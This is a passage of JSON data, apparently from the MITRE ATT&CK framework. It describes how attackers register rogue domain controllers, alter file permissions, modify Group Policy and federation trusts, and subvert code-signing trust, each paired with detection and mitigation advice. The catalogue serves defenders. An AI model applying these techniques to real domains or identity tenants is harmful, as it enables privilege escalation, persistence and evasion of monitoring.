2016)</a>.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Process: OS API Execution","Network Traffic: Network Traffic Flow","Command: Command Execution","Windows Registry: Windows Registry Key Deletion","Windows Registry: Windows Registry Key Creation","Process: Process Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."}],"subTechniques":[]},{"id":"T1207","name":"Rogue Domain Controller","description":"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. <a href=\"https://www.dcshadow.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DCShadow Blog)</a> Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. <a href=\"https://adsecurity.org/?page_id=1821\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adsecurity Mimikatz Guide)</a>\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). <a href=\"https://www.dcshadow.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DCShadow Blog)</a> The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. <a href=\"https://www.dcshadow.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DCShadow Blog)</a>","detection":"Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. <a href=\"https://github.com/shellster/DCSYNCMonitor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub DCSYNCMonitor)</a> <a href=\"https://www.dcshadow.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DCShadow Blog)</a> DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). <a href=\"https://www.dcshadow.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DCShadow Blog)</a>\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. <a href=\"https://msdn.microsoft.com/en-us/library/ms677626.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DirSync)</a> <a href=\"https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADDSecurity DCShadow Feb 2018)</a>\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. <a href=\"https://www.dcshadow.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DCShadow Blog)</a>\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. <a href=\"https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADDSecurity DCShadow Feb 2018)</a> A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Modification","Network Traffic: Network Traffic Content","User Account: User Account Authentication","Active Directory: Active Directory Object Creation"],"mitigations":[],"subTechniques":[]},{"id":"T1222","name":"File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. <a href=\"https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hybrid Analysis Icacls1 June 2018)</a> <a href=\"https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hybrid Analysis Icacls2 May 2018)</a> File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: new_rust_based_ransomware)</a> <a href=\"https://go.kaspersky.com/rs/802-IJN-240/images/TR_BlackCat_Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: bad_luck_blackcat)</a> <a href=\"https://www.crowdstrike.com/blog/falcon-overwatch-contributes-to-blackcat-protection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: falconoverwatch_blackcat_attack)</a> <a href=\"https://blog.talosintelligence.com/2022/03/from-blackmatter-to-blackcat-analyzing.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: blackmatter_blackcat)</a> <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-behavior\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: fsutil_behavior)</a>","detection":"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified. <a href=\"https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EventTracker File Permissions Feb 2014)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Active Directory: Active Directory Object Modification","Command: Command Execution","File: File Metadata"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Applying more restrictive permissions to files and directories could prevent adversaries from modifying their access control lists. Additionally, ensure that user settings regarding local and remote symbolic links are properly set or disabled where unneeded. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-symbolic-links\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: create_sym_links)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality."}],"subTechniques":[{"id":"T1222.001","name":"Windows Permissions","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. <a href=\"https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hybrid Analysis Icacls1 June 2018)</a> <a href=\"https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hybrid Analysis Icacls2 May 2018)</a> File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). <a href=\"https://docs.microsoft.com/windows/desktop/secauthz/dacls-and-aces\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DACL May 2018)</a> Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied. <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Access Control Lists May 2018)</a>\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as <code>icacls</code>, <code>cacls</code>, <code>takeown</code>, and <code>attrib</code>, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.","detection":"Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified. <a href=\"https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EventTracker File Permissions Feb 2014)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Active Directory: Active Directory Object Modification","Process: Process Creation","File: File Metadata"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality."}]},{"id":"T1222.002","name":"Linux and Mac Permissions","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. <a href=\"https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hybrid Analysis Icacls1 June 2018)</a> <a href=\"https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hybrid Analysis Icacls2 May 2018)</a> File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Unix Shell Configuration Modification or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow. <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a>","detection":"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include <code>chmod +x</code>, <code>chmod -R 755</code>, and <code>chmod 777</code>. <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a> \n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files.","platforms":["Linux","macOS"],"dataSources":["Process: Process Creation","File: File Metadata","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Applying more restrictive permissions to files and directories could prevent adversaries from modifying the access control lists."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure critical system files as well as those known to be abused by adversaries have restrictive permissions and are owned by an appropriately privileged account, especially if access is not required by users nor will inhibit system functionality."}]}]},{"id":"T1484","name":"Domain or Tenant Policy Modification","description":"Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.\n\nModifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.\n\nWith sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs to push a malicious Scheduled Task to computers throughout the domain environment <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a> <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Abusing GPO Permissions)</a>\n* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)</a>\n* changing configuration settings within the AD environment to implement a Rogue Domain Controller.\n* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant <a href=\"https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Cross-Tenant Impersonation 2023)</a>\n\nAdversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.","detection":"It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>. <a href=\"https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)</a> <a href=\"https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 365 Defender Solorigate)</a> This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details. <a href=\"https://www.sygnia.co/golden-saml-advisory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Golden SAML)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/aa21-008a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA SolarWinds Cloud Detection)</a>\n\nConsider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings. <a href=\"https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Update or Repair Federated domain)</a> Some domain policy modifications, such as changes to federation settings, are likely to be rare. <a href=\"https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 365 Defender Solorigate)</a>","platforms":["Windows","Identity Provider"],"dataSources":["Active Directory: Active Directory Object Deletion","Active Directory: Active Directory Object Creation","Command: Command Execution","Active Directory: Active Directory Object Modification","Application Log: Application Log Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blogs.technet.microsoft.com/askds/2008/09/11/fun-with-wmi-filters-in-group-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WMI Filters)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/Policy/filtering-the-scope-of-a-gpo\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPO Security Filtering)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Use least privilege and protect administrative access to the Domain Controller and Active Directory Federation Services (AD FS) server. Do not create service accounts with administrative privileges."},{"id":"M1047","name":"Audit","description":"Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later) <a href=\"https://github.com/BloodHoundAD/BloodHound\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Bloodhound)</a>."}],"subTechniques":[{"id":"T1484.001","name":"Group Policy Modification","description":"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path <code>\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>. <a href=\"https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Group Policy Basics)</a> <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a> \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more. <a href=\"https://adsecurity.org/?p=2716\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity GPO Persistence 2016)</a> <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Abusing GPO Permissions)</a> <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M Trends 2016)</a> <a href=\"https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Hacking Team Breach)</a> Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a>\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <code>&amp;lt;GPO_PATH&amp;gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Abusing GPO Permissions)</a> In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&amp;lt;GPO_PATH&amp;gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs. <a href=\"https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y SeEnableDelegationPrivilege Right)</a>","detection":"It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\n\n* Event ID 5136 - A directory service object was modified\n* Event ID 5137 - A directory service object was created\n* Event ID 5138 - A directory service object was undeleted\n* Event ID 5139 - A directory service object was moved\n* Event ID 5141 - A directory service object was deleted\n\n\nGPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).","platforms":["Windows"],"dataSources":["Command: Command Execution","Active Directory: Active Directory Object Creation","Active Directory: Active Directory Object Modification","Active Directory: Active Directory Object Deletion"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to. <a href=\"https://wald0.com/?p=179\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wald0 Guide to GPOs)</a> <a href=\"https://blogs.technet.microsoft.com/askds/2008/09/11/fun-with-wmi-filters-in-group-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WMI Filters)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/desktop/Policy/filtering-the-scope-of-a-gpo\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPO Security Filtering)</a>"},{"id":"M1047","name":"Audit","description":"Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as BloodHound (version 1.5.1 and later). <a href=\"https://github.com/BloodHoundAD/BloodHound\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Bloodhound)</a>"}]},{"id":"T1484.002","name":"Trust Modification","description":"Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure AD Federation)</a> These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user. <a href=\"https://o365blog.com/post/federation-vulnerability/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals zure AD Federated Domain)</a> \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant. <a href=\"https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Cross-Tenant Impersonation 2023)</a> This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts. <a href=\"https://d1.awsstatic.com/onedam/marketing-channels/website/aws/en_US/events/approved/reinforce-2025/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS re Inforce Trust Mod)</a>","detection":"Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>. <a href=\"https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)</a> This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details. <a href=\"https://www.sygnia.co/golden-saml-advisory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Golden SAML)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/aa21-008a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA SolarWinds Cloud Detection)</a>\n\nMonitor for PowerShell commands such as: <code>Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\"</code>, or <code>Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\" –supportmultipledomain</code>. <a href=\"https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Update or Repair Federated domain)</a>","platforms":["Identity Provider","Windows"],"dataSources":["Command: Command Execution","Application Log: Application Log Content","Active Directory: Active Directory Object Modification","Active Directory: Active Directory Object Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, limit permissions to create new identity providers to only those accounts that require them. In AWS environments, consider using Service Control policies to limit the use of API calls such as <code>CreateSAMLProvider</code> or <code>CreateOpenIDConnectProvider</code>."},{"id":"M1026","name":"Privileged Account Management","description":"Use the principal of least privilege and protect administrative access to domain trusts and identity tenants."}]}]},{"id":"T1553","name":"Subvert Trust Controls","description":"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a> Adversaries may also create or steal code signing certificates to acquire trust on target systems. <a href=\"https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Digital Certificates)</a> <a href=\"http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Digital Certificates)</a>","detection":"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a> A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity. <a href=\"https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Code Signing Dec 2017)</a>\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected. <a href=\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Subverting Trust Sept 2017)</a> \n\nMonitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.","platforms":["Linux","macOS","Windows"],"dataSources":["Module: Module Load","Windows Registry: Windows Registry Key Creation","File: File Metadata","Command: Command Execution","Process: Process Creation","File: File Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Components may 